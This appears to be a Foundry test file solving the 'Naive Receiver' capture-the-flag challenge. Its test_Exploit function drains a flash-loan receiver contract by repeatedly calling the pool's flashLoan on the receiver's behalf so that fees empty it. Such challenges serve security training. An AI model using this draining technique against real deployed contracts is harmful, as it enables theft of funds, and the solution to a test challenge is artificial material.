// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {NaiveReceiverLenderPool} from "src/naive-receiver/NaiveReceiverLenderPool.sol";
import {FlashLoanReceiver} from "src/naive-receiver/FlashLoanReceiver.sol";

contract NaiveReceiverTest is Test {
    uint256 constant ETHER_IN_POOL = 1_000 ether;
    uint256 constant ETHER_IN_RECEIVER = 10 ether;
    address constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    address deployer = makeAddr("DEPLOYER");
    address player = makeAddr("PLAYER");
    address user = makeAddr("USER");

    NaiveReceiverLenderPool pool;
    FlashLoanReceiver receiver;

    function setUp() public {
        /**
         * SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
         */
        vm.startPrank(deployer);

        pool = new NaiveReceiverLenderPool();
        vm.deal(address(pool), ETHER_IN_POOL);

        receiver = new FlashLoanReceiver(address(pool));
        vm.deal(address(receiver), ETHER_IN_RECEIVER);

        vm.stopPrank();
    }

    function test_SetUpState() public {
        assertEq(address(pool).balance, ETHER_IN_POOL);
        assertEq(pool.maxFlashLoan(ETH), ETHER_IN_POOL);
        assertEq(pool.flashFee(ETH, 0), 1 ether);

        vm.expectRevert();
        receiver.onFlashLoan(deployer, ETH, ETHER_IN_RECEIVER, 1 ether, "");

        assertEq(address(receiver).balance, ETHER_IN_RECEIVER);
    }

    function test_Exploit() public {
        /**
         * SOLUTION
         */
        vm.startPrank(player);

        while (address(receiver).balance > 0) {
            pool.flashLoan(receiver, ETH, 0, "");
        }

        vm.stopPrank();

        /**
         * SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE
         */
        assertEq(address(receiver).balance, 0);
        assertEq(address(pool).balance, ETHER_IN_POOL + ETHER_IN_RECEIVER);
    }
}
